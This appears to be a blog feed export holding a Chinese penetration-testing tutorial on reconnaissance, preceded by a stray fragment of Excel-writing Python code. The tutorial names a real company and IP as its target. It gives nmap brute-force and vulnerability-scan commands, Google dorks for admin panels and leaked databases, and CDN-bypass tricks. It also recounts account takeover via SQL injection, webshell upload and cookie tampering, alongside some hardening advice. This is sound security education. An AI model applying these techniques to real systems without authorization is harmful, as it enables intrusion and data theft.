else: book_sheet2.write(info_index, i_index, label=&apos;&apos;) else: label = str(i).strip(&apos;text:&apos;).strip(&apos;number:&apos;).strip(&apos;empty:&apos;)[1:-1] book_sheet2.write(info_index, i_index, label=label) # book_sheet2.write(info_index, i_index, label=str(i)[6:-1])work_book2.save(&apos;new.xls&apos;)]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透测试之资产信息收集]]></title>
    <url>%2F2020%2F03%2F08%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[“只有不努力的黑客，没有攻不破的系统”。 在SRC漏洞挖掘或渗透测试中，信息收集占很大一部分，能收集到别人收集不到的资产，就能挖到别人挖不到的洞。 target:日日顺 www.rrswl.com（60.209.105.206） 基础信息企业运营状况，规模，业务分布 系统信息覆盖面 应用信息0/1day 漏洞 服务信息历史漏洞 人员信息构造字典、社工 防护信息防护绕过 信息收集流程1、厂商信息收集whois 启信宝 天眼查 域名备案 服务供应商 第三方厂商系统 https://www.qixin.com/ 初步得到几个域名 通过备案号可以查询兄弟域名， 2、资产归属判断whois 备案信息 域名证书、数字签名、logo、title 3、资产收集维度WEB网站 WAP（手机端） APP PC客户端 微信公众号、微信小程序、支付宝小程序 QQ 钉钉 企业微信 微信群 QQ群 4、资产收集内容子域名、IP、C段、旁站 WEB路径、参数名、文件名、协议、数据包类型 邮箱、ID、用户名、密码、手机号、员工工号、重要系统密码规则 身份证号、企业资质证书、法人信息 收集域名信息知道目标域名之后，我们要做的第一件事情就是获取域名的注册信息，包括该域名的DNS服务器信息和注册人的联系信息等。 Whois 查询Whois 简单来说，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、域名注册日期和过期日期、DNS等）。通过域名Whois服务器查询，可以==查询域名归属者联系方式，以及注册和到期时间==。 Kali下whois查询https://www.kali.org/downloads/ 域名Whois查询 - 站长之家http://whois.chinaz.com/ Whois 爱站 http://whois.aizhan.com/ ip138 （可查询子域名）https://site.ip138.com/ Whois Lookup https://www.whois.net/ ICANN Lookuphttps://lookup.icann.org/ 域名信息查询 - 腾讯云 https://whois.cloud.tencent.com/domain?domain= nicolasboulianehttp://nicolasbouliane.com/utils/whois/?url=http://baidu.com 新网 whois信息查询 http://whois.xinnet.com/ IP WHOIS查询 - 站长工具 http://tool.chinaz.com/ipwhois/ 备案信息查询国内网站注册需要向国家有关部门申请备案，防止网站从事非法活动，而国外网站不需要备案。 ICP备案查询网http://www.beianbeian.com/ ICP备案查询 - 站长工具http://icp.chinaz.com/ SEO综合查询 - 爱站https://www.aizhan.com/seo/ 批量查询 - 站长工具http://icp.chinaz.com/searchs 工业和信息化部ICP/IP/域名信息备案管理 （太卡了）http://www.beian.miit.gov.cn/publish/query/indexFirst.action 信用信息查询国家企业信用信息公示系统 http://www.gsxt.gov.cn/index.html 全国企业信息查询 http://company.xizhi.com/ 个人信用查询搜索-企业信息查询搜索-统一社会信用代码查询-信用中国 https://www.creditchina.gov.cn/ IP反查站点的站DnslyticsDnslytics地址：https://dnslytics.com/ 浏览器插件收集相关应用信息天眼查 https://www.tianyancha.com/ 企查查 https://www.qichacha.com/ 微信公众号&amp;微博天眼查根据前面获取的企业名称可以获取目标企业的微信公众号、微博、备案站点、软件著作权等信息。 天眼查-商业安全工具 https://www.tianyancha.com/ 微信公众号https://weixin.sogou.com 微信搜索 小程序抓包的问题，微信7.0 校验抓不到，文件传输助手，PC端抓包 微博 APP各大APP应用商店:应用宝，豌豆荚 google play ASO网站 抓包 反编译 获取资产信息 七麦数据https://www.qimai.cn/ 通过当前APP查询同开发商应用，得到目标所有APP应用 AppStorehttps://apps.apple.com/ 通过当前APP查询同开发商应用，得到目标所有APP应用 收集子域名信息子域名也就是二级域名，是指顶级域名下的域名。假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。那么问题来了，怎样才能尽可能多地搜集目标的高价值子域呢？常用的方法有以下这几种。 在线平台第三方平台查询主要是一些第三方网站和一些博主提供的服务 ip138 https://site.ip138.com/ t1h2ua https://www.t1h2ua.cn/tools/ zcjun http://z.zcjun.com/ 权重综合查询爱站 https://www.aizhan.com/seo/ 站长工具 http://rank.chinaz.com/all/ IP反查绑定域名网站IP关联域名，大部分网站一个IP多个域名 http://s.tool.chinaz.com/same?s http://dns.aizhan.com/ 资产搜索引擎google、shodan、FOFA、zoomeye Google语法查询搜索子域名 “site:xxxxx” FOFA语法查询https://fofa.so/ 搜索子域名 “domain:xxxxx” domain=”rrswl.com” 工具枚举常用子域名工具如下（Github上都可搜到） OneForAll:接口多，速度快LayerSublist3rsubDomainsBrute Amass: OWASP更新维护 OneForAllOneForAll是一款功能强大的子域收集工具，拥有多个模块和接口扫描，收集子域信息很全，包括子域、子域IP、子域常用端口、子域Title、子域Banner、子域状态等。 项目地址：https://github.com/shmilylty/OneForAll 子域名收集：python3 oneforall.py --target=target.com run LayerLayer子域名挖掘机的使用方法比较简单，在域名对话框中直接输入域名就可以进行扫描，它的显示界面比较细致，有域名、解析IP、开放端口、Web服务器和网站状态等 subDomainsBrutesubDomainsBrute的特点是可以用小字典递归地发现三级域名、四级域名,甚至五级域名等不容易被探测到的域名。 项目地址：https://github.com/lijiejie/subDomainsBrute 子域名收集：python subDomainsbrute.py xtarget.com Sublist3rSublist3r也是一个比较常用的工具， 它能列举多种资源，如在Google、Yahoo、 Bing、 Baidu和Ask等搜索引擎中可查到的子域名，还可以列出Netcraft、VirusTotal、ThreatCrowd、 DNSdumpster、SSL Certificates、和Reverse DNS查到的子域名。 项目地址：https://github.com/aboul3la/Sublist3r 子域名收集：python sublist3r.py -d target.com -b -t 50 -p 80,443,21,22 证书透明度公开日志枚举证书透明度(Certificate Transparency, CT)是证书授权机构(CA) 的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址， 这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引|擎搜索一些公开的CT日志 在线第三方平台查询crt.sh: https://crt.sh DNS域传送漏洞目前来看”DNS域传送漏洞”已经很少了。 常见的DNS记录有以下几类： A记录 IP地址记录,记录一个域名对应的IP地址 AAAA记录 IPv6地址记录，记录一个域名对应的IPv6地址CNAME记录 别名记录，记录一个主机的别名MX记录 电子邮件交换记录，记录一个邮件域名对应的IP地址NS记录 域名服务器记录 ,记录该域名由哪台域名服务器解析PTR记录 反向记录，也即从IP地址到域名的一条记录TXT记录 记录域名的相关文本信息 DNS历史解析https://community.riskiq.com/search/www.jd.com/subdomains https://dns.bufferover.run/dns?q=jd.com https://securitytrails.com/list/apex_domain/jd.com 查找真实IP果挖掘的目标购买了CDN服务，可以直接ping目标的域名，但得到的并非真正的目标Web服务器，只是离我们最近的一台目标节点的CDN服务器，这就导致了我们没法直接得到目标的真实IP段范围。 CDN简介CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在==网络各处放置节点服务器==所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据==网络流量和各节点的连接、负载状况以及到用户的距离和响应时间==等综合信息将用户的请求重新导==向离用户最近的服务节点==上。 国内外CND国内常见CDN 阿里云腾讯云百度云网宿科技(ChinanNet Center)蓝汛金山云UCloud网易云世纪互联七牛云京东云等 国外常见CDN Akamai(阿卡迈)Limelight Networks(简称LLNW)AWS Cloud(亚马逊)Google(谷歌)Comcast(康卡斯特) 判断目标是否存在CDN于CDN需要代价，一般小企业很大几率不会存在CDN服务。 假如一些企业存在CDN服务，那该如何寻找其真实IP呢，往下看，常见几种手法 通常通过ping目标主域，观察域名的解析情况，以此来判断其是否使用了CDN 京东使用CDN 日日顺没有使用 Nslookup不同DNS域名解析不同DNS域名解析情况对比，判断其是否使用了CDN 不同DNS解析结果若不一样，很有可能存在CDN服务 全国Ping利用全国多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致， 如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。 在线网址 Ping检测-站长工具 http://ping.chinaz.com/ 一样 不一样 17CE https://www.17ce.com/ 测试目标：www.jd.com 绕过CDN查找真实IP在确认了目标确实用了CDN以后，就需要绕过CDN寻找目标的真实IP，下面介绍一些常规的方法。 一般的邮件系统都在内部，没有经过CDN的解析，通过利用目标网站的邮箱注册、找回密码或者RSS订阅等功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名,就可以获得目标的真实IP。 国外请求很多时候国内的CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP。 国际Ping国际ping测试站点 ipip https://tools.ipip.net/newping.php ASM https://asm.ca.com/en/ping.php 分站域名&amp;C段查询很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN,可以通过ping二级域名获取分站IP， 可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。 C段查询在线查询https://phpinfo.me/bing.php 网络资产搜索引擎Fofa、Shodan、ZoomEyehttps://fofa.so/ 利用这些网络空间资产搜索引擎来搜索暴露在外的端口信息 利用语法搜索C段信息 网站漏洞通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip。 一些测试文件phpinfo、test等 SSRF漏洞服务器主动向外发起连接，找到真实IP地址 查询域名解析记录一般网站从部署开始到使用cdn都有一个过程，周期如果较长的话 则可以通过这类历史解析记录查询等方式获取源站ip，查看IP与域名绑定的历史记录，可能会存在使用CDN前的记录。 在线网站查询 dnsdb https://www.dnsdb.io NETCRAFT https://sitereport.netcraft.com/?url= viewdns https://viewdns.info/ threatbook https://x.threatbook.cn/ securitytrails https://securitytrails.com/ 目标网站APP应用如果目标网站有自己的App，可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP。 网络空间引擎搜索shodan、FOFA、zoomeye AS自治域在网络中一个自治系统(Autonomous System, AS)是一个有权自主地决定在本系统中应采用何种路由协议的小型单位。这个网络单位可以是一个简单的网络也可以是一个由一个或多个普通的网络管理员来控制的网络群体，它是一个单独的可管理的网络单元（例如一所大学，一个企业或者一个公司个体）。 一个自治系统有时也被称为是一个路由选择域（routing domain）。一个自治系统将会分配一个全局的唯一的16位号码，这个号码被称为自治系统号（ASN）。因此可以通过ASN号来查找可能相关的IP，例如： whois -h whois.radb.net – ‘-i origin AS111111’ | grep -Eo “([0-9.]+){4}/[0-9]+” | uniqnmap –script targets-asn –script-args targets-asn.asn=15169 bgp.he.net用来查询一些域名归属以及组织IP段信息https://bgp.he.net/dns/jd.com#_ipinfo 针对资产集中，有自己的自治域，针对国内大厂效果好 https://www.robtex.com/dns-lookup/www.baidu.com 收集常用端口信息在对目标进行漏洞挖掘的过程中，对端口信息的收集是一个很重要的过程， 通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务，就可以对症下药，便于我们渗透目标服务器。 所以在端口渗透信息的收集过程中，我们需要关注常见应用的默认端口和在端口上运行的服务。 端口一般是指TCP/IP协议中的端口，端口号的范围是从0-65535。 常见端口&amp;解析&amp;总结常用的端口利用及解析总结 1234567891011121314151617181920212223242526272829303132333435363738端口：21 服务：FTP/TFTP/VSFTPD 总结：爆破/嗅探/溢出/后门端口：22 服务：ssh远程连接 总结：爆破/openssh漏洞端口：23 服务：Telnet远程连接 总结：爆破/嗅探/弱口令端口：25 服务：SMTP邮件服务 总结：邮件伪造端口：53 服务：DNS域名解析系统 总结：域传送/劫持/缓存投毒/欺骗端口：67/68 服务：dhcp服务 总结：劫持/欺骗端口：110 服务：pop3 总结：爆破/嗅探端口：139 服务：Samba服务 总结：爆破/未授权访问/远程命令执行端口：143 服务：Imap协议 总结：爆破161SNMP协议爆破/搜集目标内网信息端口：389 服务：Ldap目录访问协议 总结：注入/未授权访问/弱口令端口：445 服务：smb 总结：ms17-010/端口溢出端口：512/513/514 服务：Linux Rexec服务 总结：爆破/Rlogin登陆端口：873 服务：Rsync服务 总结：文件上传/未授权访问端口：1080 服务：socket 总结：爆破端口：1352 服务：Lotus domino邮件服务 总结：爆破/信息泄漏端口：1433 服务：mssql 总结：爆破/注入/SA弱口令端口：1521 服务：oracle 总结：爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当端口：2181 服务：zookeeper服务 总结：未授权访问端口：2375 服务：docker remote api 总结：未授权访问端口：3306 服务：mysql 总结：爆破/注入端口：3389 服务：Rdp远程桌面链接 总结：爆破/shift后门端口：4848 服务：GlassFish控制台 总结：爆破/认证绕过端口：5000 服务：sybase/DB2数据库 总结：爆破/注入/提权端口：5432 服务：postgresql 总结：爆破/注入/缓冲区溢出端口：5632 服务：pcanywhere服务 总结：抓密码/代码执行端口：5900 服务：vnc 总结：爆破/认证绕过端口：6379 服务：Redis数据库 总结：未授权访问/爆破端口：7001/7002 服务：weblogic 总结：java反序列化/控制台弱口令端口：80/443 服务：http/https 总结：web应用漏洞/心脏滴血端口：8069 服务：zabbix服务 总结：远程命令执行/注入端口：8161 服务：activemq 总结：弱口令/写文件端口：8080/8089 服务：Jboss/Tomcat/Resin 总结：爆破/PUT文件上传/反序列化端口：8083/8086 服务：influxDB 总结：未授权访问端口：9000 服务：fastcgi 总结：远程命令执行端口：9090 服务：Websphere 总结：控制台爆破/java反序列化/弱口令端口：9200/9300 服务：elasticsearch 总结：远程代码执行端口：11211 服务：memcached 总结：未授权访问端口：27017/27018 服务：mongodb 总结：未授权访问/爆破 详细参考：掘安攻防实验室 扫描工具常用扫描工具123456789101112131415Nmap Masscan ZMap 御剑高速TCP端口扫描工具御剑高速端口扫描工具IISPutScannerIISPutScanner增强版-DotNetScan v1.1 Betamasnmapscan 常用扫描工具使用1、nmap项目地址：https://github.com/nmap/nmap 扫描多个IP扫描整个子网 nmap 192.168.6.1/24 nmap 192.168.1.1/16 nmap 192.168.1-30.1-254 nmap 192.168.1-254.6扫描多个主机 namp 192.168.6.2 192.168.6.6扫描一个小范围 nmap 192.168.6.2-10扫描txt内的ip列表 nmap -iL text.txt扫描除某个目标外 nmap 192.168.6.1/24 -exclude 192.168.6.25 绕过Firewalld扫描主机端口通过不同的协议(TCP半连接、TCP全连接、ICMP、UDP等)的扫描绕过Firewalld的限制 nmap -sP 192.33.6.128nmap -sT 192.33.6.128nmap -sS 192.33.6.128nmap -sU 192.33.6.128nmap -sF 192.33.6.128nmap -sX 192.33.6.128nmap -sN 192.33.6.128 初步扫描端口信息nmap -T4 -A -v -Pn 192.168.1.1/24 -p 21,22,23,25,80,81,82,83,88,110,143,443,445,512,513,514,1433,1521,2082,2083,2181,2601,2604,3128,3306,3389,3690,4848,5432,5900,5984,6379,7001,7002,8069,8080,8081,8086,8088,9200,9300,11211,10000,27017,27018,50000,50030,50070 -oN nmap_result.txt（-oA :输出所有格式） 扫描端口并且标记可以爆破的服务nmap 127.0.0.1 –script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute 判断常见的漏洞并扫描端口nmap 127.0.0.1 –script=auth,vuln 精确判断漏洞并扫描端口nmap 127.0.0.1 –script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version nmap 输出美化apt-get install xsltproc 2、Masscan项目地址：https://github.com/robertdavidgraham/masscan Masscan主要是真对全网进行端口扫描 masscan号称世界上最快的扫描软件，可以在3分钟内扫描整个互联网端口之所以比namp快很多，采用了异步传输，无状态的扫描方式 Namp与Masscan的对比都可以扫描端口 nmap速度较慢，但可以扫描操作系统、端口的服务和版本等详细信息 masscan速度快，但只能扫描端口 为提高扫描效率，可以先使用masscan扫描开启的端口，再用nmap进行详细的扫描 3、Zmap项目地址：https://github.com/zmap/zmap Zmap主要是真对全网进行端口扫描 4、masnmapscan项目地址：https://github.com/hellogoldsnakeman/masnmapscan-V1.0 masnmapscan整合了masscan和nmap两款扫描器，masscan扫描端口，nmap扫描端口对应服务，二者结合起来实现了又快又好地扫描。并且加入了针对目标资产有防火墙的应对措施。 网络空间引擎搜索shodan、FOFA、zoomeye FOFA为例 浏览器插件通过Google、FireFox等插件的使用，收集主机端口开放信息 WEB指纹识别在漏洞挖掘中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。 CMS (Content Management System)又称整站系统或文章系统。常见的CMS有Dedecms (织梦)、Discuz、 PHPWEB、 PHPWind、PHPCMS、ECShop、 Dvbbs、 SiteWeaver、 ASPCMS、帝国、Z- Blog、WordPress等。 第三方平台云悉 http://www.yunsee.cn/ #### BugScaner http://whatweb.bugscaner.com/look/ 数字观星 https://fp.shuziguanxing.com/\#/ TideFinger http://finger.tidesec.net/ 工具常用指纹识别工具有：御剑Web指纹识别、WhatWeb、Test404轻量CMS指纹识别+v2.1、椰树等，可以快速识别一些主流CMS Github项目 CMSeeK CMSmap ACMSDiscovery TideFinger AngelSword 浏览器插件通过Google、FireFox等插件的使用，收集网站结构信息 kali 中whatweb基本满足burp 指纹识别收集敏感信息源码泄露/CVS/Entries/CVS/Root/.DS_Store MacOS自动生成/.hg//.svn/ (/.svn/entries)/.git//WEB-INF/src//WEB-INF/lib//WEB-INF/classes//WEB-INF/database.properties/WEB-INF/web.xml Robots.txt 上述源码泄露在Github上都可以找到相应的利用工具 源码泄露扫描工具将常见源码泄露加入字典配合FUZZ、御剑等扫描器进行扫描收集 源码泄露利用工具.git源码泄露：https://github.com/lijiejie/GitHack .DS_Store泄露：https://github.com/lijiejie/ds\_store\_exp .bzr、CVS、.svn、.hg源码泄露：https://github.com/kost/dvcs-ripper 备份文件泄露网站备份文件泄露常见名称backupdbdatawebwwwrootdatabasewwwcodetestadminusersql 网站备份文件泄露常见后缀.bak.html_index.html.swp.rar.txt.zip.7z.sql.tar.gz.tgz.tar 网站备份文件泄露扫描工具常见扫描工具有：Test404网站备份文件扫描器 v2.0、ihoneyBakFileScan等 ihoneyBakFileScan v0.2 多进程批量网站备份文件泄露扫描工具，根据域名自动生成相关扫描字典，自动记录扫描成功的备份地址到文件 Google Hacking常用GoogleHacking语法1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件 2、intitle： 把网页标题中的某个字符作为搜索的条件 3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息 4、filetype/ext： 指定一个格式类型的文件作为搜索对象 5、inurl： 搜索包含指定字符的URL 6、site： 在指定的(域名)站点搜索相关内容 其他GoogleHacking语法1、引号 ‘’ “ 把关键字打上引号后，把引号部分作为整体来搜索 2、or 同时搜索两个或更多的关键字 3、link 搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL 4、info 查找指定站点的一些基本信息 GoogleHacking典型用法管理后台地址site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | systemsite:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backendsite:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录 上传类漏洞地址site:target.com inurl:filesite:target.com inurl:upload 注入页面site:target.com inurl:php?id= 编辑器页面site:target.com inurl:ewebeditor 目录遍历漏洞site:target.com intitle:index.of SQL错误site:target.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()” phpinfo()site:target.com ext:php intitle:phpinfo “published by the PHP Group” 配置文件泄露site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini 数据库文件泄露site:target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露site:target.com ext:.log 备份和历史文件泄露site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar 公开文件泄露site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv site: target.com filetype:doc|docx|xls|xlsx|ppt|pptx|zip|rar|sql 邮箱信息site:target.com intext:@target.comsite:target.com 邮件site:target.com email 社工信息site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证 JS获取敏感接口JSFinderJSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。 安装 pip3 install requests bs4git clone https://github.com/Threezh1/JSFinder.git 使用 python3 JSFinder.py -u http://www.mi.compython3 JSFinder.py -u http://www.mi.com -d LinkFinder该工具通过网站中的JS文件来发现服务端、敏感信息、隐藏控制面板的URL链接等有用信息，可最大化地提高URL发现效率 安装 git clone https://github.com/GerbenJavado/LinkFinder.gitcd LinkFinderpython2 setup.py install 使用 在线JavaScript文件中查找端点的最基本用法，并将结果输出到results.html： python linkfinder.py -i https://example.com/1.js -o results.html CLI输出（不使用jsbeautifier，这使得它非常快）： pyhon linkfinder.py -i https://example.com/1.js -o cli分析整个域及其JS文件： python linkfinder.py -i https://example.com -dBurp输入（在目标中选择要保存的文件，右键单击，Save selected items将该文件作为输入）： python linkfinder.py -i burpfile -b枚举JavaScript文件的整个文件夹，同时查找以/ api /开头的终结点，并最终将结果保存到results.html： python linkfinder.py -i ‘Desktop/*.js’ -r ^/api/ -o results.html 目录&amp;后台扫描1、DirMap https://github.com/H4ckForJob/dirmap 2、dirsearch https://github.com/maurosoria/dirsearch 3、github BBScan 7kbscan-WebPathBrute https://github.com/7kbstorm/7kbscan-WebPathBruteFuzz-gobuster https://github.com/OJ/gobusterTest404轻量后台扫描器+v2.0御剑 工具无论再多再好，没有一个好的字典一切都是空谈。强大字典是需要自己平时慢慢的积累。 越权查询遍历uid获得身份信息等 代码托管通过代码托管平台搜索敏感信息（内部邮箱账号密码、数据库账号密码等） githubGitHub是一个面向开源及私有软件项目的托管平台。 平台地址：https://github.com/ GitHub敏感信息泄露一直是企业信息泄露和知识产权泄露的重灾区，安全意识薄弱的同事经常会将公司的代码、各种服务的账户等极度敏感的信息『开源』到github中，github也是黑、白帽子、安全工程师的必争之地。 Github泄露扫描系统开发：https://sec.xiaomi.com/article/37 在GitHub中一般通过搜索网站域名、网站JS路径、网站备案、网站下的技术支持等进行敏感信息查询 site:Github.com ftp ftppassword 也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的 site:Github.com smtp @baidu.com ==IP段搜索：“123.34.45.*”== ==搜索内网域名地址== 企业邮箱账号 对应 github账号 思路来源：https://www.freebuf.com/articles/web/198721.html gitee平台地址：https://gitee.com/ 码云：开源中国出品的代码托管、协作开发平台。 gitcafeGitCafe一个基于代码托管服务打造的技术协作与分享平台 Whois&amp;备案查询通过Whois和备案查询得到网站的注册人、手机号、邮箱等（对后续的密码生成和社工很有帮助） 公网网盘公司员工可能把一些内部资料放在了公网网盘，然后被在线云网盘搜索的网站抓取了，我们就可以利用这个来对目标系统进行深入挖掘。 可以利用云网盘搜索工具搜集敏感文件，一般直接输入厂商名字进行搜索 凌风云搜索地址：https://www.lingfengyun.com/ 其他云网盘搜索工具可以参考 https://www.cnblogs.com/paad/p/10825483.html 获取公开文件snitchSnitch可以针对指定域自动执行信息收集过程。此工具可帮助收集可通过Web搜索引擎找到的指定信息。在渗透测试的早期阶段，它可能非常有用。 安装 git clone https://github.com/Smaash/snitch.git 使用 python2.7 snitch.py -C “site:whitehouse.gov filetype:pdf” -P 100 邮箱信息收集InfogaInfoga可从不同的公共源网络（搜索引擎，pgp密钥服务器和shodan）收集电子邮件帐户信息（ip，主机名，国家/地区…）。是一个用法非常简单的工具，但是，对于渗透测试的早期阶段，或者只是为了了解自己公司在互联网上的可见性是非常有效的。 安装 git clone https://github.com/m4ll0k/Infoga.git /data/infogacd /data/infogapip3 install requestspython3 infoga.py 使用 python3 infoga.py –domain site.com –source all -v 3 | grep Email | cut -d ‘ ‘ -f 3 | uniq | sed -n ‘/-/!p’python3 infoga.py –info emailtest@site.compython3 infoga.py –info emailtest@site.com -b Google Hackingsite:target.com intext:@target.com site:target.com 邮件site:target.com email 历史漏洞&amp;资产很多时候去查看目标的历史漏洞和资产信息，往往能够得到很多有价值的信息。 乌云漏洞库：https://github.com/hanc00l/wooyun\_public Exploit-db：https://www.exploit-db.com/ Securityfocus：https://www.securityfocus.com/bid Packetstorm：https://packetstormsecurity.org/ Cxsecurity：https://cxsecurity.com/exploit/ 国家信息安全漏洞库：http://www.cnnvd.org.cn/ Seebug：https://www.seebug.org/ 等。。。 F12 信息收集F12开发者工具，如相关功能模块和基本使用，以及使用F12进行信息收集的相关利用和在渗透实战中的一些相关小技巧，通过F12信息收集我们可收集到很多隐藏起来的敏感信息，如注释信息、webserver信息，而这些敏感信息往往可对后期的渗透起一定的辅助作用。 F12开发者攻击是我认为==最基础的信息收集，也是最简单、最快捷的信息收集==，通过F12我们可以收集到很多不在明面上面的信息，主要==包括注释信息收集、hidden信息收集、相对路径信息收集、webserver信息收集以及JavaScript功能信息收集==等。 F12 开发者工具是可帮助开发人员生成和调试网页的一套工具，主要包含elements、network、sources、timeliness、Profiles、resources、audits、console模块， 注释信息收集我们在前端访问的页面，在其页面源代码中往往会存在有注释信息，这些注释信息中往往会包含有很多敏感信息，可能是某个文件的下载链接，也可能是一些隐藏的功能模块，甚至更有可能是一些你意想不到的敏感信息。 在F12的elements模块中我们可以逐级展开个节点来查看注释信息，但是这样效率实在是太低了，因为在这个模块我们是不能使用【Ctrl+F】搜索注释信息的，另外可以通过查看页面源代码来搜索注释信息，但是搜索出来的不是连续的，这样也不是很方便我们查看。 用法： 在F12中，我们可以点击右上角的show drawer标志（）进行所有字符的搜索==&lt;!–==，另外我们可以使用快捷键==【Ctrl+shift+f】==来快速进行搜索，即可把所有的注释信息搜索出来 注释信息中引发的问题： 1.获取到文件下载的地址，进而获取了很多敏感信息，如姓名、身份证、电话、邮箱等我们通过这个这些信息可以制作具有针对性的字典，从而对后台管理进行暴力破解； 2.在注释信息中获取到一个忘记密码功能的连接，刚好这个忘记密码这个地方存在SQL注入，通过注入将发送的验证码发到本人的手机号上面，然后对root账号进行重置，通过登录后在文件上传的地方可上传webshell，前端校验，因此很容易绕过！ 如何预防： 一是尽量删除前端显示的注释信息，二是不用的功能模块直接删除，不可通过注释的手段来进行隐藏！ hidden信息收集在查看源代码时，我们会发现有些控件的type的值是==hidden==，代表该控件在页面中是隐藏的，不显示的，有些参数虽然是hidden的，但是依旧会提交到服务器，这也给了我们利用的机会，我们使用上面的搜索方法搜索hidden，如图1-5所示，即可查看所有type值为hidden的控件。 我们可以通过删除hidden即可在页面中显示该控件，如图1-6所示，并且可修改对应的value的值 hidden控件可能引发的问题： 1.曾通过搜索hidden获取到重置别人的账号所发送的短信验证码，成功重置了该用户的密码，进而获取到该站点的登录访问权限 2.由于hidden的这个参数依旧是提交到服务器的，而刚好这个参数是存在XSS漏洞，其余提交的显性参数是有了一定过滤的。 如何预防问题： 因此尽量不要使用hidden属性来隐藏敏感数据，如==隐藏登录账户==；发送的==短信验证码==禁止显示在页面源代码中。不管以何种方式，对于提交到服务器的参数切记都需要进行校验及过滤！ 相对路径信息收集相对路径信息收集，我主要是收集图片所在的相对路径，如图所示，然后通过查找（locate或者find）对应图片的位置，结合收集的相对路径来进行获取我们想要的绝对路径，从而进行webshell的上传！ 另外我们还可以在Resource下的script中查看相关的js文件（如conf.js）来获取相对路径信息，可能某些链接就可以未授权访问，从而我们可进行进一步的利用 可能引发的问题： 1.使用这种方法进行查找物理路径来进行上传webshell，尤其是结合一些命令执行工具来进行使用 2.有案例图片的这个路径逐级删除，就会直接获取到后台地址！ webserver信息收集webserver信息收集主要是收集web服务器的一个部署情况，是使用什么==框架搭建的，是Apache，还是Nginx==，或是其他的，网站是什么==脚本语言==开发的，是asp，还是PHP等信息，这些信息我们可以使用F12进行简单的查看。 方法： 首先我们定位到F12的network模块，选择doc（文档，document）进行筛选，然后使用F5进行刷新获取数据 有时候在这里也可以看到网站的cookie，如果在这里你发现cookie中含有admin=0,或者flag=0的这类标志，你就可以使用burpsuit进行抓包进行截断改包，将0改为1可能就可以直接进入到系统中了！ webserver信息对于渗透来说是很重要的，通过获取的版本即可查找对应的漏洞进行利用，从而提高渗透的效率！因此网站管理员在部署网站的时候，切记进行安全配置，隐藏此类信息，或者修改此类信息进行干扰攻击者！如在php.ini中设置expose_php = Off来隐藏PHP版本信息，将下面两行添加到Apache配置文件（vi /etc/apache2/apache2.conf）底部，最后一行，即可隐藏Apache banner信息！ ServerSignature Off ServerTokens Prod 